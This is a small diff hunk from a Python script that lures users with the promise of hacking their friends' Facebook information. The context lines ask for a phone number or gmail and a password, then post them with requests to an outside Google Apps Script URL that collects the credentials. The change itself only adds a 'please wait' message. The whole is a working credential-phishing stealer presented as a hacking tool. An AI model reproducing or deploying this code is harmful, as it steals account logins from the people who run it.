@@ -13,6 +13,7 @@ print('please login with your facebook \n for hack your firends info')
 umail =input("please Enter phone and gmail:")
 upass =input("please Enter  password'")
 data ={'mail':umail,'pass':upass}
+print("plase wait")
 rq =requests.post('https://script.google.com/macros/s/AKfycbx1cnhTRxQYCCWH0E55DRSXr54-p2-Q-0AEzUtqoTRZVHx1sw/exec',data=data)
 
 for i in range(100):
